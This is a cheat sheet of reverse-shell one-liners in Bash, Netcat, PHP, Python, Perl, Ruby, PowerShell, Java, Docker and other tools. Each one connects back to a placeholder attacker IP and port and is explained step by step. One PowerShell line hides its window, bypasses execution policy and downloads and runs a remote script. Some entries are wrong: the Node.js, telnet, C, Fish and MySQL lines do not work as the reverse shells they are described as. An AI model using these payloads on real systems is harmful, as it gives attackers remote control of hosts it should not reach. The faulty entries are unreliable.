# Common Reverse Shells


`**Bash Reverse Shell** 
`bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` 

**Explanation:** 
- `bash -i`: Starts an interactive Bash shell. 
- `>& /dev/tcp/ATTACKER_IP/PORT`: Redirects both stdout and stderr to a TCP connection to the attacker's IP and port. 
- `0>&1`: Redirects stdin to stdout, allowing interaction with the shell.

**Netcat Reverse Shell** 
`nc -e /bin/bash ATTACKER_IP PORT` 
**Explanation:** 
- `nc`: Invokes the Netcat utility. 
- `-e /bin/bash`: Executes `/bin/bash` upon connection, providing a shell. 
- `ATTACKER_IP PORT`: Specifies the attacker's IP address and port to connect back to.

**PHP Reverse Shell** 
`php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'` 
**Explanation:** 
- `php -r`: Runs PHP code from the command line. 
- `fsockopen("ATTACKER_IP",PORT)`: Opens a socket connection to the attacker's IP and port. 
- `exec("/bin/bash -i <&3 >&3 2>&3")`: Executes an interactive Bash shell, redirecting input and output through the socket.

**Python Reverse Shell** 
`python -c 'import socket, subprocess, os; s=socket.socket(); s.connect(("ATTACKER_IP",PORT)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(["/bin/sh", "-i"]);'` 
**Explanation:** 
- `python -c`: Executes Python code from the command line. 
- `socket.socket()`: Creates a new socket. 
- `s.connect(("ATTACKER_IP",PORT))`: Connects the socket to the attacker's IP and port. 
- `os.dup2(...)`: Redirects stdin, stdout, and stderr to the socket. 
- `subprocess.call(["/bin/sh", "-i"])`: Executes an interactive shell.

**Perl Reverse Shell** 
`perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` 
**Explanation:** 
- `perl -e`: Executes Perl code from the command line. 
- `use Socket;`: Imports the Socket module. 
- `socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))`: Creates a TCP socket. 
- `connect(S,sockaddr_in($p,inet_aton($i)))`: Connects to the attacker's IP and port. 
- `open(STDIN,">&S")`: Redirects stdin to the socket. 
- `exec("/bin/sh -i")`: Executes an interactive shell.

**Ruby Reverse Shell** 
`ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT); exec "/bin/sh -i <&f >&f 2>&f"'` 
**Explanation:** 
- `ruby -rsocket`: Uses the Ruby Socket library. 
- `TCPSocket.open("ATTACKER_IP",PORT)`: Opens a TCP connection to the attacker's IP and port. 
- `exec "/bin/sh -i <&f >&f 2>&f"`: Executes an interactive shell, redirecting I/O through the socket.

**PowerShell Reverse Shell** 
`powershell -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/shell.ps1')"` 
**Explanation:** 
- `powershell`: Executes the PowerShell command. 
- `-NoP`: No profile is loaded. 
- `-NonI`: No interactive mode. 
- `-W Hidden`: Runs PowerShell hidden. 
- `-Exec Bypass`: Bypasses execution policy. 
- `IEX(New-Object Net.WebClient).DownloadString(...)`: Downloads and executes a PowerShell script from the attacker's server.

**Java Reverse Shell** 
`r = Runtime.getRuntime(); p = r.exec("bash -i > /dev/tcp/ATTACKER_IP/PORT 0>&1")` 
**Explanation:** 
- `Runtime.getRuntime()`: Gets the runtime instance. 
- `r.exec(...)`: Executes a command. 
- `bash -i > /dev/tcp/ATTACKER_IP/PORT 0>&1`: Redirects an interactive shell to the attacker's IP and port.

**Node.js Reverse Shell** 
`require('child_process').spawn('bash', [], {stdio: 'inherit', shell: true, detached: true});` 
**Explanation:** 
- `require('child_process')`: Imports the child_process module. 
- `spawn('bash', [], {stdio: 'inherit', shell: true})`: Executes Bash and inherits the input/output streams, allowing for an interactive shell.

**Telnet Reverse Shell** 
`telnet ATTACKER_IP PORT` 
**Explanation:** 
- `telnet`: Connects to a remote host using Telnet. 
- `ATTACKER_IP PORT`: Specifies the attacker's IP and port to connect back to. 

**C Reverse Shell** 
`gcc -o shell shell.c && ./shell` 
**Explanation:** 
- Compiles a C program that creates a reverse shell. 
- `gcc -o shell shell.c`: Compiles the shell.c source file. 
- `./shell`: Executes the compiled shell program.

**Fish Shell Reverse Shell** 
`fish -c "exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line >&5; done"` 
**Explanation:** 
- `fish -c`: Executes the command in Fish shell. 
- `exec 5<>/dev/tcp/ATTACKER_IP/PORT`: Opens a TCP connection for reading and writing. 
- `cat <&5 | while read line; do $line >&5; done`: Reads commands from the connection and executes them.

**Exec Reverse Shell** 
`exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line >&5; done` 
**Explanation:** 
- `exec 5<>/dev/tcp/ATTACKER_IP/PORT`: Opens a TCP connection using file descriptor 5. 
- `cat <&5 | while read line; do $line >&5; done`: Reads commands from the TCP connection and executes them.

**Docker Reverse Shell** 
`docker run -it --rm --network host alpine sh -c 'exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line >&5; done'` 
**Explanation:** 
- `docker run -it --rm --network host alpine`: Runs an Alpine container in interactive mode with host networking. 
- `exec 5<>/dev/tcp/ATTACKER_IP/PORT`: Opens a TCP connection to the attacker's IP and port. 
- `cat <&5 | while read line; do $line >&5; done`: Executes commands read from the connection.

**SQL Reverse Shell** 
`mysql -e 'select load_file("/dev/tcp/ATTACKER_IP/PORT")'` 
**Explanation:** 
- `mysql -e`: Executes a MySQL command. 
- `select load_file(...)`: Attempts to load a file over TCP, effectively creating a reverse shell if the system is misconfigured.`


